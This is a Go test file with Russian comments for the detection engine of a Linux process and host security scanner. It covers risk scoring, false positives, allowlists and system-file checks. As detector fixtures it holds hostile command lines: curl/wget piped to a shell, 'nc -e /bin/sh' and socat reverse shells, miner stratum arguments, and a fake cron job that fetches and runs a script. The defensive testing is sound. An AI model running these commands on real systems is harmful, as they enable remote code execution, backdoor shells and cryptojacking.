package detect

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"syscall"
	"testing"
	"time"

	"github.com/Zagorsky17/ServerSecurityGo/internal/model"
)

// ids возвращает ID сработавших (не справочных) признаков.
func ids(p *model.Process) []string {
	var out []string
	for _, f := range p.Findings {
		if f.Category != model.CatInfo {
			out = append(out, f.ID)
		}
	}
	return out
}

func analyze(procs ...*model.Process) {
	Analyze(procs, &Context{Cfg: DefaultConfig()})
}

func TestScoreCaps(t *testing.T) {
	// Один признак одной категории без «сильных» — не выше LOW, даже
	// если вес велик.
	_, r, expl := Score([]model.Finding{{ID: "a", Title: "A", Category: model.CatLocation, Weight: 50}})
	if r != model.RiskLow {
		t.Errorf("одна категория без сильных: %s", r)
	}
	if !strings.Contains(expl, "ограничен") {
		t.Errorf("в объяснении нет причины ограничения: %s", expl)
	}
	// Сильный признак одной категории — не выше MEDIUM.
	if _, r, _ := Score([]model.Finding{{Category: model.CatContent, Weight: 80, Strong: true}}); r != model.RiskMedium {
		t.Errorf("одна категория с сильным: %s", r)
	}
	// Две категории — не выше HIGH, если сильных меньше двух.
	if _, r, _ := Score([]model.Finding{{Category: model.CatContent, Weight: 40, Strong: true}, {Category: model.CatLocation, Weight: 40}}); r != model.RiskHigh {
		t.Errorf("две категории: %s", r)
	}
	// Две категории с двумя сильными — CRITICAL возможен.
	if _, r, _ := Score([]model.Finding{{Category: model.CatContent, Weight: 35, Strong: true}, {Category: model.CatNetwork, Weight: 40, Strong: true}}); r != model.RiskCritical {
		t.Errorf("два сильных: %s", r)
	}
	// Справочные и подавленные признаки не учитываются.
	s, r, _ := Score([]model.Finding{{Category: model.CatInfo, Weight: 100}, {Category: model.CatContent, Weight: 30, Suppressed: true}})
	if s != 0 || r != model.RiskInfo {
		t.Errorf("info/suppressed: %d %s", s, r)
	}
}

func TestLegitimateProcessesStayInfo(t *testing.T) {
	procs := []*model.Process{
		{PID: 1, Name: "systemd", Exe: "/usr/lib/systemd/systemd", Args: []string{"/sbin/init"}},
		{PID: 2, Name: "kthreadd", Kernel: true},
		{PID: 600, PPID: 1, Name: "sshd", Exe: "/usr/sbin/sshd", Args: []string{"sshd: /usr/sbin/sshd -D"}, EUID: 0},
		{PID: 700, PPID: 1, Name: "nginx", Exe: "/usr/sbin/nginx", Args: []string{"nginx: master process"}},
		{PID: 701, PPID: 700, Name: "nginx", Exe: "/usr/sbin/nginx", Args: []string{"nginx: worker process"}},
		{PID: 800, PPID: 1, Name: "postgres", Exe: "/usr/lib/postgresql/16/bin/postgres", Args: []string{"postgres: checkpointer"}},
		{PID: 900, PPID: 600, Name: "bash", Exe: "/usr/bin/bash", Args: []string{"-bash"}, Files: []model.OpenFile{{FD: 0, Target: "/dev/pts/0", Kind: "device"}}},
		{PID: 950, PPID: 1, Name: "python3", Exe: "/usr/bin/python3.12", Args: []string{"/usr/bin/python3", "/usr/bin/networkd-dispatcher"}},
		{PID: 960, PPID: 1, Name: "containerd-shim", Exe: "/usr/bin/containerd-shim-runc-v2", Args: []string{"/usr/bin/containerd-shim-runc-v2", "-namespace", "moby"}},
		{PID: 970, PPID: 1, Name: "node", Exe: "/home/deploy/.nvm/versions/node/v20/bin/node", Args: []string{"node", "app.js"}, UID: 1000, EUID: 1000},
	}
	Analyze(procs, &Context{Cfg: DefaultConfig()})
	for _, p := range procs {
		if p.Risk != model.RiskInfo {
			t.Errorf("PID %d %s: риск %s, признаки %v", p.PID, p.Name, p.Risk, ids(p))
		}
	}
}

func TestMinerInTmp(t *testing.T) {
	p := &model.Process{PID: 10, PPID: 1, Name: "kworkerds", Exe: "/dev/shm/.x/kworkerds", Args: []string{"[kworker/u8:2]"}, EUID: 0,
		Sockets: []model.Socket{{Proto: "tcp", State: "ESTABLISHED", RemoteAddr: "198.51.100.7", RemotePort: 3333}}}
	analyze(p)
	for _, want := range []string{"exe_in_temp", "exe_hidden_path", "kthread_masquerade", "pool_port", "root_from_writable"} {
		if !slices.Contains(ids(p), want) {
			t.Errorf("нет признака %s: %v", want, ids(p))
		}
	}
	if p.Risk != model.RiskCritical {
		t.Errorf("риск %s (%d)", p.Risk, p.Score)
	}
	if len(p.Recommendations) == 0 || !strings.Contains(p.Explanation, "CRITICAL") {
		t.Errorf("нет рекомендаций или объяснения: %q", p.Explanation)
	}
}

func TestReverseShellChain(t *testing.T) {
	web := &model.Process{PID: 100, PPID: 1, Name: "php-fpm8.3", Exe: "/usr/sbin/php-fpm8.3", Args: []string{"php-fpm: pool www"}}
	sh := &model.Process{PID: 200, PPID: 100, Name: "bash", Exe: "/usr/bin/bash", Args: []string{"bash", "-i"},
		Files:   []model.OpenFile{{FD: 0, Target: "socket:[555]", Kind: "socket"}, {FD: 1, Target: "socket:[555]", Kind: "socket"}},
		Sockets: []model.Socket{{Proto: "tcp", Inode: 555, State: "ESTABLISHED", LocalAddr: "10.0.0.2", LocalPort: 50000, RemoteAddr: "203.0.113.9", RemotePort: 9001}}}
	analyze(web, sh)
	got := ids(sh)
	for _, want := range []string{"web_spawns_shell", "stdio_socket", "revshell_pattern", "shell_network"} {
		if !slices.Contains(got, want) {
			t.Errorf("нет %s: %v", want, got)
		}
	}
	if sh.Risk != model.RiskCritical {
		t.Errorf("риск %s", sh.Risk)
	}
	if web.Risk != model.RiskInfo {
		t.Errorf("родитель не должен получать признаки: %s %v", web.Risk, ids(web))
	}
}

func TestStdioUnixSocketIsNotReverseShell(t *testing.T) {
	// У служб под systemd stdout часто подключён к unix-сокету журнала.
	p := &model.Process{PID: 300, PPID: 1, Name: "python3", Exe: "/usr/bin/python3.12", Args: []string{"python3", "/opt/app/main.py"},
		Files:   []model.OpenFile{{FD: 1, Target: "socket:[777]", Kind: "socket"}, {FD: 2, Target: "socket:[777]", Kind: "socket"}},
		Sockets: []model.Socket{{Proto: "unix", Inode: 777, Path: "/run/systemd/journal/stdout"}}}
	analyze(p)
	if slices.Contains(ids(p), "stdio_socket") {
		t.Errorf("ложное срабатывание: %v", ids(p))
	}
}

func TestSingleWeakSignals(t *testing.T) {
	// Только высокая нагрузка — не выше LOW.
	p := &model.Process{PID: 400, PPID: 1, Name: "ffmpeg", Exe: "/usr/bin/ffmpeg", Args: []string{"ffmpeg"}, CPUPercent: 99, Key: "k"}
	Analyze([]*model.Process{p}, &Context{Cfg: DefaultConfig(), Counters: func(string) Counters { return Counters{HighCPUScans: 50} }})
	if p.Risk != model.RiskLow || !slices.Contains(ids(p), "cpu_sustained") {
		t.Errorf("CPU: %s %v", p.Risk, ids(p))
	}
	// Только имя майнера — не выше LOW.
	m := &model.Process{PID: 401, PPID: 1, Name: "xmrig", Exe: "/usr/local/bin/xmrig", Args: []string{"xmrig"}}
	analyze(m)
	if m.Risk != model.RiskLow {
		t.Errorf("имя майнера: %s %v", m.Risk, ids(m))
	}
	// Только запуск из /tmp — не выше LOW.
	tmp := &model.Process{PID: 402, PPID: 1, Name: "installer", Exe: "/tmp/installer", Args: []string{"/tmp/installer"}, UID: 1000, EUID: 1000}
	analyze(tmp)
	if tmp.Risk != model.RiskLow {
		t.Errorf("/tmp: %s %v", tmp.Risk, ids(tmp))
	}
}

func TestDeletedSystemBinaryIsLow(t *testing.T) {
	p := &model.Process{PID: 500, PPID: 1, Name: "sshd", Exe: "/usr/sbin/sshd", ExeDeleted: true, Args: []string{"sshd"}}
	analyze(p)
	if p.Risk != model.RiskLow || p.Score > 5 {
		t.Errorf("обновлённая служба: %s %d %v", p.Risk, p.Score, ids(p))
	}
}

func TestMemfd(t *testing.T) {
	p := &model.Process{PID: 600, PPID: 1, Name: "x", Exe: "/memfd:payload", ExeDeleted: true, Args: []string{"x"}}
	analyze(p)
	if !slices.Contains(ids(p), "exe_memfd") || slices.Contains(ids(p), "exe_deleted") {
		t.Errorf("memfd: %v", ids(p))
	}
	runc := &model.Process{PID: 601, PPID: 1, Name: "runc:[2:INIT]", Exe: "/memfd:runc_cloned:/proc/self/exe", Args: []string{"runc", "init"}}
	analyze(runc)
	if runc.Risk > model.RiskLow {
		t.Errorf("runc: %s %v", runc.Risk, ids(runc))
	}
}

func TestPatterns(t *testing.T) {
	cases := map[string]string{
		"bash -c curl -s http://x.example/a.sh | bash":          "download_exec",
		"sh -c wget -qO- http://x/y|sh":                         "download_exec",
		"sh -c echo aGVsbG8= | base64 -d | sh":                  "download_exec",
		"nc -e /bin/sh 198.51.100.1 4444":                       "revshell_pattern",
		"python3 -c import pty;pty.spawn('/bin/bash')":          "revshell_pattern",
		"socat tcp:198.51.100.1:443 exec:/bin/bash,pty":         "revshell_pattern",
		"./x -o stratum+tcp://pool.example:3333 -u wallet":      "miner_pattern",
		"/opt/m/run --donate-level 1 --cpu-max-threads-hint 75": "miner_pattern",
	}
	for cmd, want := range cases {
		p := &model.Process{PID: 700, PPID: 1, Name: "x", Exe: "/usr/bin/x", Args: strings.Fields(cmd)}
		analyze(p)
		if !slices.Contains(ids(p), want) {
			t.Errorf("%q: нет %s, есть %v", cmd, want, ids(p))
		}
	}
	// Безобидные строки.
	for _, cmd := range []string{"curl -o /tmp/file https://example.com", "nc -zv host 22", "bash /opt/app/start.sh", "python3 -m http.server"} {
		p := &model.Process{PID: 701, PPID: 1, Name: "x", Exe: "/usr/bin/x", Args: strings.Fields(cmd)}
		analyze(p)
		if p.Risk != model.RiskInfo {
			t.Errorf("%q: ложное срабатывание %v", cmd, ids(p))
		}
	}
}

func TestRuntimeFalsePositives(t *testing.T) {
	// Найдено на настоящей системе (раннер GitHub Actions).
	py := &model.Process{PID: 1, PPID: 0, Name: "python3", Exe: "/usr/bin/python3.12", Args: []string{"python3", "agent.py"}}
	child := &model.Process{PID: 2, PPID: 1, Name: "python3", Exe: "/usr/bin/python3.12", Args: []string{"python3", "-m", "worker"}}
	udev := &model.Process{PID: 3, PPID: 0, Name: "systemd-udevd", Exe: "/usr/bin/udevadm", Args: []string{"/usr/lib/systemd/systemd-udevd"}}
	pam := &model.Process{PID: 4, PPID: 0, Name: "(sd-pam)", Exe: "/usr/lib/systemd/systemd-executor", Args: []string{"(sd-pam)"}}
	analyze(py, child, udev, pam)
	for _, p := range []*model.Process{child, udev, pam} {
		if p.Risk != model.RiskInfo {
			t.Errorf("%s: %s %v", p.Name, p.Risk, ids(p))
		}
	}
	// А вот оболочка от node — слабый признак остаётся.
	node := &model.Process{PID: 5, PPID: 0, Name: "node", Exe: "/usr/bin/node", Args: []string{"node"}}
	sh := &model.Process{PID: 6, PPID: 5, Name: "sh", Exe: "/usr/bin/dash", Args: []string{"sh", "-c", "npm run build"}}
	analyze(node, sh)
	if !slices.Contains(ids(sh), "web_spawns_shell") || sh.Risk != model.RiskLow {
		t.Errorf("node → sh: %s %v", sh.Risk, ids(sh))
	}
}

func TestMasquerade(t *testing.T) {
	p := &model.Process{PID: 800, PPID: 1, Name: "sshd", Exe: "/var/lib/.cache/sshd", Args: []string{"sshd"}}
	analyze(p)
	if !slices.Contains(ids(p), "system_name_masquerade") {
		t.Errorf("нет system_name_masquerade: %v", ids(p))
	}
	mm := &model.Process{PID: 801, PPID: 1, Name: "httpd", Exe: "/usr/local/bin/backdoor", Args: []string{"httpd"}}
	analyze(mm)
	if !slices.Contains(ids(mm), "name_mismatch") {
		t.Errorf("нет name_mismatch: %v", ids(mm))
	}
}

func TestLDPreloadAndPerms(t *testing.T) {
	p := &model.Process{PID: 900, PPID: 1, Name: "app", Exe: "/opt/app/app", Args: []string{"app"}, EnvFlags: []string{"LD_PRELOAD"},
		ExeInfo: &model.FileInfo{Mode: "-rwxrwxrwx", WorldWritable: true, UID: 0}}
	analyze(p)
	for _, want := range []string{"ld_preload", "exe_world_writable"} {
		if !slices.Contains(ids(p), want) {
			t.Errorf("нет %s: %v", want, ids(p))
		}
	}
	// В доказательствах нет значения переменной.
	for _, f := range p.Findings {
		for _, e := range f.Evidence {
			if strings.Contains(e, "=/") {
				t.Errorf("значение окружения попало в доказательства: %s", e)
			}
		}
	}
}

func TestAllowlist(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Allow = []AllowRule{{Exe: "/tmp/build-*/runner", Rules: []string{"exe_in_temp"}}, {}}
	p := &model.Process{PID: 1000, PPID: 1, Name: "runner", Exe: "/tmp/build-42/runner", Args: []string{"runner"}, UID: 1000, EUID: 1000}
	Analyze([]*model.Process{p}, &Context{Cfg: cfg})
	if p.Risk != model.RiskInfo {
		t.Errorf("allowlist не сработал: %s %v", p.Risk, ids(p))
	}
	found := false
	for _, f := range p.Findings {
		if f.ID == "exe_in_temp" && f.Suppressed {
			found = true
		}
	}
	if !found {
		t.Error("подавленный признак должен оставаться видимым")
	}
	if !strings.Contains(p.Explanation, "allowlist") {
		t.Errorf("объяснение не упоминает подавление: %s", p.Explanation)
	}
}

func TestSystemChecks(t *testing.T) {
	root := t.TempDir()
	write := func(rel, content string, mt time.Time) {
		path := filepath.Join(root, rel)
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
		if err := os.Chtimes(path, mt, mt); err != nil {
			t.Fatal(err)
		}
	}
	old := time.Now().Add(-90 * 24 * time.Hour)
	write("etc/ld.so.preload", "/lib/libhide.so\n", old)
	write("etc/cron.d/evil", "* * * * * root wget -q -O- http://203.0.113.5/x | sh\n", old)
	write("etc/cron.d/ok", "0 3 * * * root /usr/sbin/logrotate /etc/logrotate.conf\n", old)
	write("etc/cron.d/tmp", "0 * * * * root /tmp/cleanup.sh\n", old)
	write("etc/cron.d/new", "0 4 * * * root /usr/bin/true\n", time.Now())
	write("root/.ssh/authorized_keys", "ssh-ed25519 AAAAC3Nza... admin@laptop\n", time.Now())

	res := SystemChecks(root, time.Now(), DefaultConfig())
	byPath := map[string]model.SystemFinding{}
	for _, f := range res {
		byPath[f.Path+"|"+f.ID] = f
	}
	expect := map[string]model.Risk{
		"/etc/ld.so.preload|ld_so_preload":           model.RiskHigh,
		"/etc/cron.d/evil|autostart_suspicious":      model.RiskMedium,
		"/etc/cron.d/tmp|autostart_temp":             model.RiskLow,
		"/etc/cron.d/new|autostart_recent":           model.RiskInfo,
		"/root/.ssh/authorized_keys|ssh_keys_recent": model.RiskLow,
	}
	for k, r := range expect {
		f, ok := byPath[k]
		if !ok {
			t.Errorf("нет находки %s; есть %v", k, keys(byPath))
			continue
		}
		if f.Risk != r {
			t.Errorf("%s: риск %s, ожидался %s", k, f.Risk, r)
		}
	}
	for k := range byPath {
		if strings.HasPrefix(k, "/etc/cron.d/ok|") {
			t.Errorf("ложное срабатывание: %s", k)
		}
		if strings.Contains(byPath[k].Evidence[0], "AAAAC3Nza") {
			t.Error("содержимое ключа SSH попало в отчёт")
		}
	}
}

func keys(m map[string]model.SystemFinding) []string {
	var out []string
	for k := range m {
		out = append(out, k)
	}
	slices.Sort(out)
	return out
}

// TestAllowlistNameOnly: правило без exe не подавляет признаки процесса,
// который лишь назвался разрешённым именем.
func TestAllowlistNameOnly(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Allow = []AllowRule{{Name: "runner", Rules: []string{"exe_in_temp"}}, {Name: "systemd-journal", Rules: []string{"exe_in_temp"}}}
	run := func(name, exe string) bool {
		p := &model.Process{PID: 1000, PPID: 1, Name: name, Exe: exe, Args: []string{name}, UID: 1000, EUID: 1000}
		Analyze([]*model.Process{p}, &Context{Cfg: cfg})
		for _, f := range p.Findings {
			if f.ID == "exe_in_temp" {
				return f.Suppressed
			}
		}
		t.Fatalf("%s: нет exe_in_temp", exe)
		return false
	}
	if !run("runner", "/tmp/build-1/runner") {
		t.Error("законный runner не подавлен")
	}
	if run("runner", "/tmp/.x/xmrig") {
		t.Error("xmrig с именем runner подавлен правилом только по имени")
	}
	if nameMatchesExe("runner", "") {
		t.Error("процесс без прочитанного exe совпал с правилом по имени")
	}
	// comm обрезается до 15 байт: systemd-journald → «systemd-journal».
	if !run("systemd-journal", "/tmp/x/systemd-journald") {
		t.Error("обрезанный comm не совпал с exe")
	}
	weak := WeakAllowRules([]AllowRule{{Name: "node"}, {User: "deploy"}, {Exe: "/opt/a"}, {}})
	if len(weak) != 2 || !strings.Contains(weak[0], "без exe") || !strings.Contains(weak[1], "только пользователь") {
		t.Errorf("WeakAllowRules: %q", weak)
	}
}

func TestUnicodeControl(t *testing.T) {
	p := &model.Process{PID: 50, PPID: 1, Name: "ss​hd", Exe: "/usr/sbin/sshd", Args: []string{"sshd", "‮txt.exe"}}
	f := findingByIDLocal(p, "unicode_control")
	if f == nil || len(f.Evidence) != 2 || !strings.Contains(f.Evidence[0], "U+200B") || !strings.Contains(f.Evidence[1], "U+202E") {
		t.Fatalf("признак: %+v", f)
	}
	if findingByIDLocal(&model.Process{PID: 51, PPID: 1, Name: "nginx", Exe: "/usr/sbin/nginx", Args: []string{"nginx: кириллица"}}, "unicode_control") != nil {
		t.Error("ложное срабатывание на обычной строке")
	}
}

func findingByIDLocal(p *model.Process, id string) *model.Finding {
	analyze(p)
	for i := range p.Findings {
		if p.Findings[i].ID == id {
			return &p.Findings[i]
		}
	}
	return nil
}

// findingByID анализирует процесс и возвращает признак с этим ID.
func findingByID(p *model.Process, id string) *model.Finding {
	analyze(p)
	for i := range p.Findings {
		if p.Findings[i].ID == id {
			return &p.Findings[i]
		}
	}
	return nil
}

func TestCmdlineTruncated(t *testing.T) {
	p := &model.Process{PID: 42, Name: "bash", Exe: "/usr/bin/bash", Args: []string{"bash", "-c", "x"}, Cmdline: "bash -c x", CmdlineTruncated: true}
	f := findingByID(p, "cmdline_truncated")
	if f == nil || f.Weight != 8 {
		t.Fatalf("признак: %+v", f)
	}
	j := &model.Process{PID: 43, Name: "java", Exe: "/usr/bin/java", Args: []string{"java", "-cp", "a.jar"}, Cmdline: "java -cp a.jar", CmdlineTruncated: true}
	if f := findingByID(j, "cmdline_truncated"); f == nil || f.Weight != 2 {
		t.Fatalf("java: %+v", f)
	}
	p.CmdlineTruncated = false
	if findingByID(p, "cmdline_truncated") != nil {
		t.Error("признак без обрезки")
	}
}

// systemChecksTimeout запускает SystemChecks и падает, если проверки
// зависли (FIFO вместо файла раньше блокировал сканирование навсегда).
func systemChecksTimeout(t *testing.T, root string) []model.SystemFinding {
	t.Helper()
	done := make(chan []model.SystemFinding, 1)
	go func() { done <- SystemChecks(root, time.Now(), DefaultConfig()) }()
	select {
	case res := <-done:
		return res
	case <-time.After(10 * time.Second):
		t.Fatal("SystemChecks зависли")
		return nil
	}
}

// TestSystemChecksUnsafeKeys: authorized_keys в домашнем каталоге
// контролирует пользователь. FIFO, симлинк на устройство или чужой файл и
// огромный файл не читаются, а дают признак ssh_keys_not_regular.
func TestSystemChecksUnsafeKeys(t *testing.T) {
	root := t.TempDir()
	mk := func(user string) string {
		dir := filepath.Join(root, "home", user, ".ssh")
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatal(err)
		}
		return filepath.Join(dir, "authorized_keys")
	}
	if err := syscall.Mkfifo(mk("fifo"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("/dev/zero", mk("zero")); err != nil {
		t.Fatal(err)
	}
	secret := filepath.Join(root, "secret")
	if err := os.WriteFile(secret, []byte("a\nb\nc\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(secret, mk("link")); err != nil {
		t.Fatal(err)
	}
	big, err := os.Create(mk("big"))
	if err != nil {
		t.Fatal(err)
	}
	if err := big.Truncate(4 << 30); err != nil { // разреженный файл 4 ГБ
		t.Fatal(err)
	}
	big.Close()
	if err := os.WriteFile(mk("ok"), []byte("ssh-ed25519 AAAA user@host\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	res := systemChecksTimeout(t, root)
	got := map[string]string{}
	for _, f := range res {
		got[f.Path] += f.ID + " " + strings.Join(f.Evidence, "; ") + "|"
	}
	for user, want := range map[string]string{"fifo": "FIFO", "zero": "/dev/zero", "link": "ссылка", "big": "больше лимита"} {
		g := got["/home/"+user+"/.ssh/authorized_keys"]
		if !strings.Contains(g, "ssh_keys_not_regular") || !strings.Contains(g, want) {
			t.Errorf("%s: %q, ожидался ssh_keys_not_regular с «%s»", user, g, want)
		}
		if strings.Contains(g, "ssh_keys_recent") {
			t.Errorf("%s: файл прочитан (%q)", user, g)
		}
	}
	// Обычный файл по-прежнему проверяется.
	if g := got["/home/ok/.ssh/authorized_keys"]; !strings.Contains(g, "ssh_keys_recent") || !strings.Contains(g, "ключей: 1") {
		t.Errorf("обычный authorized_keys: %q", g)
	}
}

// TestSystemChecksPreloadSymlink: /etc/ld.so.preload принадлежит root, и
// загрузчик идёт по ссылке — значит, и проверка должна. FIFO на его месте
// не вешает сканирование.
func TestSystemChecksPreloadSymlink(t *testing.T) {
	root := t.TempDir()
	if err := os.MkdirAll(filepath.Join(root, "etc"), 0o755); err != nil {
		t.Fatal(err)
	}
	lib := filepath.Join(root, "hidden.cfg")
	if err := os.WriteFile(lib, []byte("/lib/libhide.so\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(lib, filepath.Join(root, "etc/ld.so.preload")); err != nil {
		t.Fatal(err)
	}
	if !hasSystem(systemChecksTimeout(t, root), "ld_so_preload") {
		t.Error("ld.so.preload через симлинк не обнаружен")
	}

	root2 := t.TempDir()
	if err := os.MkdirAll(filepath.Join(root2, "etc"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := syscall.Mkfifo(filepath.Join(root2, "etc/ld.so.preload"), 0o644); err != nil {
		t.Fatal(err)
	}
	systemChecksTimeout(t, root2) // главное — не зависнуть
}

func hasSystem(res []model.SystemFinding, id string) bool {
	for _, f := range res {
		if f.ID == id {
			return true
		}
	}
	return false
}
